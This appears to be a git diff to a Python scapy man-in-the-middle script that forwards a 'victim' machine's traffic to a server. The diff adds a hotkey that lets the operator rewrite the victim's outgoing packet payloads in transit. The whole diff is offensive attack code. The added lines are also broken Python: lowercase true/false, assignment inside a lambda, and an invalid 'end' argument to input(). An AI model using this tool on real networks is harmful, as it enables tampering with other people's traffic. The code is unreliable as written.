@@ -2,6 +2,24 @@ from scapy.all import *
 from router_ip_mac import get_router_ip, get_mac
 from scapy.layers import http
 import copy
+import keyboard
+
+flag = false
+
+keyboard.on_press_key('i', lambda _: flag = true)
+
+def modify(packet):
+    raw_data = packet[Raw].load
+    modification = raw_data.strip().splitlines()[-1]
+    print("You want to modify this line: " + modification)
+    newVal = input("Put here the modified data: ", end="")
+    modified_raw = raw_data.replace(modification, newVal)
+    packet[Raw].load = modified_raw
+    flag = false
+    return packet
+
+
+
 
 #disables the confirmation of send packages
 conf.verb = 0
@@ -35,6 +53,8 @@ def forward_packet(packet):
             packet2[Ether].dst = victim_mac
             sendp(packet2)
         elif packet[Ether].src == victim_mac and packet[IP].dst == server_ip and packet[Ether].dst == my_mac:
+            if flag and packet.haslayer(Raw):
+                packet2 = modify(packet2)
             packet2[Ether].dst = server_mac
             packet2[Ether].dst = server_mac
             sendp(packet2)
